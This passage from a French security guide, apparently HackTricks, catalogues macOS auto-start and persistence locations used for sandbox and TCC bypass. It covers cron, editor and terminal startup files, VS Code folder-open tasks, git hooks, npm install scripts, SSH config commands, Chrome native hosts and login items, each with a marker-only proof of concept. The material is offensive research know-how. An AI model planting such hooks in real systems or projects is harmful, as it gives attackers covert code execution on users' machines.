defaults delete com.apple.loginwindow LogoutHook
```

Celui de l'utilisateur root est stocké dans **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> Vous trouverez ici des emplacements de démarrage utiles pour le **sandbox bypass**, qui vous permettent simplement d'exécuter quelque chose en **l'écrivant dans un fichier** et en **comptant sur des conditions peu courantes**, comme la présence de **programmes spécifiques**, des actions d'**utilisateurs « peu communs »** ou certains environnements.

### Cron

**Writeup** : [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Utile pour le sandbox bypass : [✅](https://emojipedia.org/check-mark-button)
  - Cependant, vous devez pouvoir exécuter le binaire `crontab`
  - Ou être root
- TCC bypass : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- **`/usr/lib/cron/tabs/`**
  - L'accès direct en écriture nécessite les privilèges root. Aucun privilège root n'est requis si vous pouvez exécuter `crontab <file>`
  - **Déclencheur** : La planification dans la crontab installée. `at` et `periodic` sont des mécanismes distincts présentés ci-dessous.

#### Description et exploitation

Affichez les tâches cron de l'**utilisateur actuel** avec :

```bash
crontab -l
```

Le fichier plist launchd du démon cron système comporte une entrée `QueueDirectories` pour `/usr/lib/cron/tabs` ; c’est là que sont conservés les crontabs des utilisateurs installés. L’inspection des crontabs d’autres utilisateurs nécessite les privilèges root :

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

Dans un compte jetable, une entrée cron utilisateur contenant uniquement un marqueur peut être installée avec `crontab`, puis supprimée après l’avoir observée. L’exécution de `crontab <file>` **remplace l’intégralité du crontab existant du compte** ; sauvegardez-le et restaurez-le si le compte n’est pas jetable :<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Writeup : [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
- Contournement de TCC : [✅](https://emojipedia.org/check-mark-button)
  - iTerm2 disposait auparavant d’autorisations TCC

#### Emplacements

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Déclencheur** : lancer iTerm2 avec un script Python API admissible dans ce dossier
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Déclencheur** : lancer iTerm2 ; le hook de démarrage AppleScript est documenté séparément
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Déclencheur** : créer une session avec le profil dont la commande ou le texte initial invoque le payload

#### Description et exploitation

Le [guide actuel de l’API Python d’iTerm2](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) documente l’exécution automatique des scripts **Python** dans `~/Library/Application Support/iTerm2/Scripts/AutoLaunch`. Il ne confirme pas qu’un fichier exécutable `.sh` quelconque placé dans ce dossier sera lancé. Pour un compte jetable, enregistrez le script suivant sous `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py` :

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

Le [guide AppleScript actuel d’iTerm2](https://iterm2.com/documentation-scripting.html) documente séparément `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`, avec un chemin de repli hérité `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt` lorsque le dossier moderne n’existe pas. Voici un AppleScript ne contenant qu’un marqueur :

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

Ces exemples de scripts ont été vérifiés à l’aide de la documentation d’iTerm2, mais n’ont pas été exécutés dans la session de bureau active. Après les avoir testés dans un compte jetable, supprimez le script de test et `/tmp/ht-iterm-autolaunch-marker` ou `/tmp/iterm2-autolaunchscpt`, selon le cas.

Les préférences d’iTerm2 situées dans **`~/Library/Preferences/com.googlecode.iterm2.plist`** peuvent spécifier une commande de profil ou un texte initial. Ce dernier est saisi dans une session ; son exécution dépend d’un shell qui l’interprète. [La documentation des profils d’iTerm2](https://iterm2.com/documentation-preferences-profiles-general.html) décrit la commande exécutée lors de la création d’une nouvelle session avec ce profil.

Ce paramètre peut être configuré dans les réglages d’iTerm2 :

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Et la commande est reflétée dans les préférences :

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

Pour une évaluation sans risque, inspectez le profil choisi dans les réglages d’iTerm2 ou lisez une copie de son fichier de préférences. Modifier `Initial Text` dans un profil actif affecterait les sessions d’un utilisateur. Aucune préférence n’a donc été modifiée sur le Mac de recherche.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Utile pour contourner sandbox : [✅](https://emojipedia.org/check-mark-button)
  - Mais xbar doit être installé
- Contournement de TCC : [✅](https://emojipedia.org/check-mark-button)
  - Le programme demande des autorisations d’accessibilité

#### Emplacement

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **Déclencheur** : au lancement de xbar

#### Description

Si le programme populaire [**xbar**](https://github.com/matryer/xbar) est installé, il est possible d’écrire un script shell dans **`~/Library/Application\ Support/xbar/plugins/`** qui sera exécuté au lancement de xbar :<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
  - Mais Hammerspoon doit être installé
- TCC bypass : [✅](https://emojipedia.org/check-mark-button)
  - Il demande les autorisations d’accessibilité

#### Emplacement

- **`~/.hammerspoon/init.lua`**
  - **Déclencheur** : À l’exécution de Hammerspoon

#### Description

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) est une plateforme d’automatisation pour **macOS**, qui s’appuie sur le **langage de script LUA**. Elle permet notamment d’intégrer du code AppleScript complet et d’exécuter des scripts shell, ce qui étend considérablement ses capacités de script.<sup>[[13]](#references)</sup>

L’application recherche un seul fichier, `~/.hammerspoon/init.lua`, et exécute le script au démarrage.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
  - Mais BetterTouchTool doit être installé
- Contournement de TCC : [✅](https://emojipedia.org/check-mark-button)
  - Il demande les autorisations Automation-Shortcuts et Accessibility

#### Emplacement

- Un fichier de script **déjà référencé** par un préréglage BetterTouchTool activé, ou la configuration de ce préréglage dans `~/Library/Application Support/BetterTouchTool/`. Le chemin précis du script dépend de la configuration du préréglage.

[La référence des actions de BetterTouchTool](https://docs.folivora.ai/docs/actions/action-definitions/) décrit les actions de script shell et de commande en arrière-plan. L’événement configuré associé au clavier, à la souris, au toucher, à un widget ou à un autre élément doit se produire lorsque le préréglage concerné est actif ; [son guide des déclencheurs](https://docs.folivora.ai/docs/configuration/new-trigger/) montre cette association. Un fichier quelconque dans le répertoire de support de l’application ne constitue pas un déclencheur. Une action déjà configurée qui charge un script externe modifiable constitue une cible d’écriture-vers-exécution plus restreinte. Le code s’exécute avec le compte de l’utilisateur de BetterTouchTool, sous réserve des autorisations macOS réellement accordées. BetterTouchTool était absent de `/Applications` sur le Mac de recherche ; aucun préréglage n’a donc été modifié ou exécuté localement.

### Alfred

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
  - Mais Alfred doit être installé
- Contournement de TCC : [✅](https://emojipedia.org/check-mark-button)
  - Il demande les autorisations Automation, Accessibility et même Full-Disk access

#### Emplacement

- Un script ou fichier **déjà référencé** par un workflow Alfred installé, ou ce workflow dans le répertoire `Alfred.alfredpreferences` configuré par l’utilisateur. Le répertoire des préférences peut être synchronisé et son chemin n’est pas universellement fixe.

[Le guide des workflows d’Alfred](https://www.alfredapp.com/help/workflows/) décrit le prérequis Powerpack et l’installation via son interface utilisateur. Le hotkey, le mot-clé ou un autre déclencheur configuré d’un workflow installé doit se déclencher ; [l’exemple de hotkey d’Alfred](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) présente une action de script. [La référence de l’environnement d’Alfred](https://www.alfredapp.com/help/workflows/script-environment-variables/) expose le chemin des préférences sélectionné sous le nom `alfred_preferences`. Déposer un fichier de workflow non enregistré dans un répertoire quelconque ne prouve pas qu’il sera installé ou exécuté. Le code s’exécute avec le compte de l’utilisateur connecté à Alfred, avec les autorisations macOS réellement accordées. Alfred était absent de `/Applications` sur le Mac de recherche ; cette voie a donc été évaluée uniquement à partir de la documentation.

### Commandes de script Raycast et actualisation des extensions

- **Cible d’écriture :** Un script exécutable dans un répertoire **déjà ajouté** sous Raycast Settings → Script Commands. Raycast ne parcourt pas un répertoire nouvellement créé au hasard. [Le guide des commandes de script de Raycast](https://manual.raycast.com/script-commands) décrit l’enregistrement d’un répertoire.
- **Déclencheur et identité :** Un utilisateur lance la commande indexée, un hotkey ou un mécanisme de secours configuré la lance, ou Raycast actualise un script `inline` selon son `@raycast.refreshTime` configuré. Le script s’exécute via son interpréteur avec le compte de l’utilisateur connecté à Raycast. La [référence des métadonnées en amont](https://github.com/raycast/script-commands#metadata) limite l’actualisation automatique aux commandes inline, et [le manifeste des extensions de Raycast](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) prend séparément en charge un `interval` pour les commandes d’extension installées de type `no-view` ou `menu-bar`. L’ajout d’une commande de script standard ne la programme pas automatiquement.

Pour un compte jetable avec un répertoire de scripts enregistré, voici un script inline qui ne fait que créer un marqueur :

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

Enregistrez-le dans le répertoire enregistré, rendez-le exécutable et laissez Raycast l’actualiser. Supprimez ensuite ce fichier ainsi que `/tmp/ht-raycast-refresh-marker`. Raycast n’a pas été trouvé sous son nom habituel dans `/Applications` sur le Mac de recherche ; cette procédure s’appuie donc sur la documentation et n’a pas été exécutée localement. Les autorisations d’accessibilité, d’automatisation et d’accès aux fichiers restent soumises aux invites d’autorisation de macOS.

### Tâches automatiques d’espace de travail dans Visual Studio Code

- **Cible d’écriture :** `.vscode/tasks.json` dans un espace de travail que l’utilisateur ouvrira.
- **Déclencheur :** Ouverture de cet espace de travail dans VS Code, mais uniquement si le dossier est approuvé **et** si les tâches automatiques ont été autorisées. Un espace de travail non approuvé n’exécute jamais de tâches automatiques ; par défaut, le paramètre demande confirmation à l’utilisateur avant la première exécution automatique. La [documentation des tâches de VS Code](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) et la [documentation sur l’approbation des espaces de travail](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) décrivent ces deux conditions.
- **Identité d’exécution :** Le compte de l’utilisateur de VS Code, par l’intermédiaire du processus de tâche configuré. Il s’agit d’une exécution propre à l’application, et non d’une persistance à la connexion.

Dans un **nouvel espace de travail jetable**, placez cette tâche qui se contente de créer un marqueur dans `.vscode/tasks.json` :

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

Après avoir ouvert l’espace de travail de confiance et autorisé les tâches automatiques, vérifiez la présence de `.autostart-task-ran`. Supprimez l’entrée de tâche et le marqueur pour nettoyer. **Cela a été vérifié à partir de la documentation de Microsoft et du bundle VS Code 1.139.1 installé ; cela n’a pas été exécuté dans la session de bureau active.**

### Hôtes de messagerie native Chrome

- **Cible d’écriture :** `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json` pour l’utilisateur actuel, ou `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` pour tous les utilisateurs (écriture administrateur requise). Chromium et Chrome for Testing utilisent des répertoires différents ; consultez [le tableau des chemins actuel de Chrome](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location).
- **Déclenchement :** Une extension Chrome installée disposant de l’autorisation `nativeMessaging` appelle `chrome.runtime.connectNative()` ou `chrome.runtime.sendNativeMessage()` en utilisant le nom exact de l’hôte indiqué dans le manifeste. Chrome démarre alors le programme hôte. Ouvrir Chrome seul n’exécute pas un nouvel hôte natif arbitraire ; créer un manifeste sans extension appelante ne fait rien. [Le guide de Chrome sur la messagerie native](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) décrit cet échange.
- **Identité d’exécution :** Le compte de l’utilisateur de Chrome. Le manifeste doit indiquer un chemin absolu vers un exécutable et autoriser explicitement l’origine de l’extension appelante.

Dans un compte de navigateur jetable avec une extension de test, la paire de fichiers suivante illustre le lien entre l’écriture et l’exécution. Le nom du fichier manifeste doit correspondre à son `name`, et `TEST_EXTENSION_ID` doit être remplacé par l’ID réel de cette extension :

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

Enregistrez ce JSON sous `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json`. L’exécutable contenant uniquement un marqueur, indiqué dans le champ `path` du manifeste, peut contenir :

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

Après que l’extension de test appelle `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` depuis son service worker ou sa page d’extension, le marqueur prouve que l’hôte a démarré. Cet hôte minimal n’implémente pas le protocole de réponse de Chrome avec préfixe de longueur ; l’extension peut donc signaler une erreur de messagerie après l’écriture du marqueur. Supprimez le manifeste, l’hôte et le marqueur de test pour nettoyer. Sur macOS 26.5.2, l’application Chrome et les deux répertoires de manifestes étaient présents ; **le profil Chrome actif n’a pas été modifié ni utilisé**.

### Commandes déclenchées par des événements de touche dans Karabiner-Elements

- **Cible d’écriture :** `~/.config/karabiner/karabiner.json` dans un compte où Karabiner-Elements est installé et en cours d’exécution. Le [guide de Karabiner sur l’emplacement des fichiers](https://karabiner-elements.pqrs.org/docs/json/location/) indique que l’application surveille ce fichier et le recharge après une écriture. Les fichiers JSON dans `assets/complex_modifications` ne sont que des préréglages importables ; le simple fait d’y écrire un fichier n’active pas de règle.
- **Déclencheur :** l’événement de touche configuré une fois la règle active. La [référence de `to.shell_command`](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/) décrit l’exécution de commandes. Il ne s’agit pas d’une exécution de code à la connexion ni à chaque écriture de fichier.
- **Identité d’exécution :** l’utilisateur connecté qui exécute le processus utilisateur de Karabiner. Les autorisations propres à l’application et tout accès TCC dépendent de l’application et de sa version.

Pour un compte de test jetable, ajoutez cet objet règle au tableau `complex_modifications.rules` du profil sélectionné dans `karabiner.json`, en conservant le reste de ce profil. Appuyez sur F18 pour créer un marqueur inoffensif, puis supprimez cette règle et le marqueur. Le choix de F18 évite de remplacer une touche de saisie courante :

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

Karabiner-Elements n’était pas installé dans `/Applications` sur la machine de test macOS 26.5.2 ; il s’agit donc d’une PoC étayée par la documentation, et non d’un résultat d’exécution locale.

### Hooks Git dans un dépôt local

- **Cible d’écriture :** Un hook exécutable tel que `<repo>/.git/hooks/post-checkout`. Si `core.hooksPath` a déjà été défini, utilisez plutôt le répertoire configuré. Un hook ajouté comme fichier source suivi ordinaire n’est pas automatiquement installé dans un clone.
- **Déclencheur :** L’opération Git correspondante. Par exemple, `post-checkout` s’exécute après `git checkout` ou `git switch`, et peut également s’exécuter après un clone ou la création d’un worktree. [La référence des hooks Git](https://git-scm.com/docs/githooks) répertorie les événements et l’exigence du bit exécutable ; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) modifie le répertoire de recherche.
- **Identité d’exécution :** Le compte qui exécute Git. Le hook ne peut s’exécuter que si le répertoire des hooks effectif du dépôt est accessible en écriture à l’acteur et si l’utilisateur effectue ensuite l’opération Git concernée.

Cette PoC limitée à un marqueur crée un dépôt entièrement jetable, installe un hook et change de branche. Elle a été exécutée avec succès avec Apple Git 2.50.1 sur macOS 26.5.2 :

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### Scripts de cycle de vie npm dans un projet

- **Cible d’écriture :** la map `scripts` du fichier `package.json` d’un projet modifiable, ou d’un package de dépendance installé dont le script de cycle de vie sera exécuté par l’utilisateur. Il s’agit d’un hook du workflow de développement, et non d’une exécution à l’ouverture d’un répertoire.
- **Déclenchement et identité :** un `npm install` ou `npm ci` ultérieur, si les scripts de cycle de vie sont autorisés, exécute `preinstall`, `install` et `postinstall` avec l’identité de l’utilisateur qui lance npm. Un `npm run <name>` ordinaire exécute également les scripts `pre<name>` et `post<name>` correspondants. [La référence des cycles de vie de npm](https://docs.npmjs.com/cli/v11/using-npm/scripts) répertorie les événements ; [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) peut désactiver les scripts de cycle de vie à l’installation. La version et les paramètres de politique peuvent modifier ce qui est autorisé ; vérifiez donc la version de npm utilisée par la cible.

Cette PoC, qui se contente de créer un marqueur, a été exécutée avec npm en local dans un répertoire vide jetable. Elle ne télécharge aucune dépendance et ne modifie pas le projet d’un utilisateur :

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

Cette méthode est distincte des fichiers de démarrage de l’interpréteur Python : npm doit effectuer l’action d’installation ou d’exécution concernée, tandis que le code `site` de Python peut être chargé lors d’un lancement ordinaire de l’interpréteur. De même, les cibles génériques de `Makefile` et les définitions de tâches de build nécessitent que l’utilisateur ou un outil déjà configuré invoque cette cible ; elles ne constituent pas des mécanismes de démarrage automatique distincts du système d’exploitation.

### Configuration de démarrage de Vim

- **Cible d’écriture :** `~/.vimrc` pour l’utilisateur qui lancera Vim (ou un autre fichier de démarrage sélectionné selon l’ordre d’initialisation de Vim). [La documentation de référence sur le démarrage de Vim](https://vimhelp.org/starting.txt.html) décrit le fichier et les substitutions `VIMINIT`/`EXINIT`.
- **Déclencheur :** Un lancement ultérieur normal de Vim qui charge cette configuration. L’option `-u NONE` de Vim ignore le vimrc utilisateur. Il s’agit d’une exécution propre à l’éditeur, et non d’un déclencheur de connexion au système d’exploitation.
- **Identité d’exécution :** Le compte de l’utilisateur de Vim.

La PoC isolée suivante a été exécutée avec `/usr/bin/vim` de macOS ; elle n’écrit aucun véritable réglage Vim ni document ouvert :

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim dispose d’un chemin de configuration utilisateur distinct, `$XDG_CONFIG_HOME/nvim/init.lua` ou `init.vim`, et charge également les scripts des répertoires d’exécution `plugin/`, conformément à sa [documentation de démarrage](https://neovim.io/doc/user/starting/). Neovim n’était pas installé sur la machine de test macOS 26.5.2 ; cette variante n’y a donc pas été exécutée.

### Commandes de configuration du client SSH

- **Cible d’écriture :** `~/.ssh/config`, ou un autre fichier qu’il inclut déjà. Il s’agit d’un fichier de configuration **client** ; il est distinct du fichier côté serveur `~/.ssh/rc` décrit ci-dessous.
- **Déclenchement :** Une invocation de `ssh` correspondante. `Match exec` exécute une commande locale pendant que le client évalue sa configuration, même avec `ssh -G`, qui affiche la configuration sans se connecter. `ProxyCommand` s’exécute lorsque le client établit une connexion correspondante. `LocalCommand` ne s’exécute qu’après une connexion réussie et nécessite `PermitLocalCommand yes` (la valeur par défaut est `no`). Ces directives ont des moments d’exécution et des prérequis différents ; une simple écriture ne les exécute pas. Voir la documentation amont [OpenSSH `ssh_config(5)`](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5).
- **Identité d’exécution :** L’utilisateur local qui exécute `ssh`. Un hôte correspondant, un fichier de configuration applicable et toute connexion requise sont nécessaires. `ssh -F` permet de sélectionner un autre fichier de configuration.

Cette PoC basée uniquement sur un marqueur a été exécutée avec le client SSH d’Apple sur macOS 26.5.2. `-G` teste `Match exec` sans établir de connexion réseau ni lire la configuration SSH réelle de l’utilisateur :

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### Fichiers d’initialisation du débogueur

- **Cible d’écriture :** `~/.lldbinit` ou le fichier spécifique à l’application de priorité supérieure, comme `~/.lldbinit-lldb`. LLDB en lit un au démarrage du débogueur. Un fichier `.lldbinit` dans le répertoire courant n’est **pas** exécuté par défaut ; l’utilisateur doit activer `target.load-cwd-lldbinit` ou passer `--local-lldbinit`. Voir le [manuel LLDB](https://lldb.llvm.org/man/lldb.html).
- **Déclenchement et identité :** l’utilisateur démarre LLDB sans `--no-lldbinit` ; les commandes s’exécutent avec les privilèges de cet utilisateur. Le simple fait d’ouvrir un projet n’implique pas que le fichier `.lldbinit` du projet soit exécuté.

Le test utilisant uniquement un marqueur ci-dessous a été effectué avec LLDB sur macOS 26.5.2, dans un répertoire personnel et un répertoire de travail isolés :

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

Pour **GDB**, la [documentation amont sur le démarrage](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) répertorie `$HOME/Library/Preferences/gdb/gdbinit`, puis `~/.gdbinit` sur macOS. Un fichier `.gdbinit` dans le répertoire courant est soumis au [chemin sécurisé d’auto-chargement](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html), et `-nx`/`-nh` désactivent les fichiers d’initialisation. GDB n’était pas installé sur le Mac de test, cette variante n’a donc pas été exécutée localement.

### SSHRC

Writeup : [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
  - Mais ssh doit être activé et utilisé
- Contournement de TCC : [✅](https://emojipedia.org/check-mark-button)
  - SSH doit avoir un accès FDA

#### Emplacement

- **`~/.ssh/rc`**
  - **Déclencheur** : Connexion via ssh
- **`/etc/ssh/sshrc`**
  - Droits root requis
  - **Déclencheur** : Connexion via ssh

> [!CAUTION]
> L’activation de ssh nécessite un accès Full Disk Access :
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Description et exploitation

Par défaut, sauf si `PermitUserRC no` est défini dans `/etc/ssh/sshd_config`, lorsque l’utilisateur **se connecte via SSH**, les scripts **`/etc/ssh/sshrc`** et **`~/.ssh/rc`** sont exécutés.<sup>[[14]](#references)</sup>

### **Éléments d’ouverture de session**

Article : [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
  - Mais vous devez exécuter `osascript` avec des arguments
- Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacements

- **Application auxiliaire enregistrée comme élément d’ouverture de session :** `<MainApp>.app/Contents/Library/LoginItems/<Helper>.app` (emplacement courant pour les éléments intégrés).
  - **Déclenchement :** l’enregistrement peut démarrer immédiatement l’application auxiliaire ; elle démarre ensuite lors des prochaines ouvertures de session, sous réserve d’approbation.
- **Agent/démon intégré enregistré :** `<MainApp>.app/Contents/Library/LaunchAgents/<name>.plist` ou `Contents/Library/LaunchDaemons/<name>.plist`.
  - **Déclenchement :** un agent approuvé peut démarrer lors de son enregistrement et aux ouvertures de session suivantes ; un démon approuvé démarre au démarrage. Un démon nécessite l’approbation d’un administrateur.

#### Description

Dans **Réglages Système → Général → Ouverture et extensions**, les utilisateurs peuvent consulter les éléments d’ouverture de session et d’arrière-plan. macOS 13 et les versions ultérieures fournissent [`SMAppService`](https://developer.apple.com/documentation/servicemanagement/smappservice) pour enregistrer les éléments d’ouverture de session, les agents de lancement et les démons intégrés. Son [comportement de `register()`](https://developer.apple.com/documentation/servicemanagement/smappservice/register%28%29) varie selon le type et l’état d’approbation. **Placer une application auxiliaire dans un bundle d’app n’est pas suffisant pour enregistrer un nouvel élément d’ouverture de session.** À l’inverse, si l’exécutable d’une application auxiliaire déjà enregistrée est accessible en écriture, sa modification peut affecter son prochain lancement sans nouvel enregistrement ; vérifiez d’abord le chemin réel et les contrôles de signature du code.

Voici une méthode en lecture seule pour rechercher les applications auxiliaires intégrées sur un Mac ; elle n’enregistre ni ne lance aucune d’entre elles :

```bash
find /Applications -path '*/Contents/Library/LoginItems/*.app' -o \
  -path '*/Contents/Library/LaunchAgents/*.plist' -o \
  -path '*/Contents/Library/LaunchDaemons/*.plist' 2>/dev/null
```

Pour un plist de lancement intégré, résolvez `BundleProgram` **par rapport à la racine du bundle de l’app** (par exemple `Contents/MacOS/Helper`), comme le précise [le guide de migration de Service Management d’Apple](https://developer.apple.com/documentation/servicemanagement/updating-helper-executables-from-earlier-versions-of-macos). Un inventaire en lecture seule de `/Applications` sur le Mac de recherche a trouvé 14 entrées d’aides intégrées et cinq déclarations `BundleProgram` ; les cinq cibles ont été résolues, et deux ont passé un contrôle de possibilité d’écriture par l’utilisateur. Ce contrôle **ne permet pas d’établir** que l’un ou l’autre des helpers est enregistré, activé, exécutable après validation de la signature ou accessible depuis un sandbox. `sfltool dumpbtm` a répertorié 150 enregistrements nommés sur ce Mac ; c’est un outil d’inspection, et non un test confirmant que chaque enregistrement est actif.

Les anciens éléments d’ouverture de session peuvent également être gérés par des événements Apple. Il est possible de les répertorier, d’en ajouter et d’en supprimer depuis la ligne de commande, bien que leur ajout modifie la configuration persistante d’ouverture de session de l’utilisateur et puisse nécessiter une approbation Automation :<sup>[[15]](#references)</sup>

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

`~/Library/Application Support/com.apple.backgroundtaskmanagementagent` est un détail d’implémentation, et non un emplacement pris en charge pour installer une charge utile en écrivant simplement un fichier. Pour les nouveaux helpers, l’ancienne API `SMLoginItemSetEnabled` est remplacée par `SMAppService` ; le chemin `/var/db/com.apple.xpc.launchd/loginitems.501.plist` précédemment indiqué sur cette page était absent de la machine de test sous macOS 26.5.2. Pour évaluer les éléments d’ouverture modernes, utilisez l’API d’enregistrement et l’état de l’interface système, plutôt que de supposer l’existence d’un chemin de base de données.

### ZIP comme élément d’ouverture

(Voir la section précédente sur les éléments d’ouverture ; ceci est un complément.)

Si vous enregistrez un fichier **ZIP** comme **élément d’ouverture**, **`Archive Utility`** l’ouvrira. Par exemple, si le fichier ZIP est enregistré dans **`~/Library`** et contient le dossier **`LaunchAgents/file.plist`** avec une backdoor, ce dossier sera créé (il n’existe pas par défaut) et le plist y sera ajouté. Ainsi, à la prochaine ouverture de session de l’utilisateur, **la backdoor indiquée dans le plist sera exécutée**.

Une autre option consiste à créer les fichiers **`.bash_profile`** et **`.zshenv`** dans le répertoire HOME de l’utilisateur ; cette technique fonctionnera donc même si le dossier LaunchAgents existe déjà.

### At

Compte rendu : [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
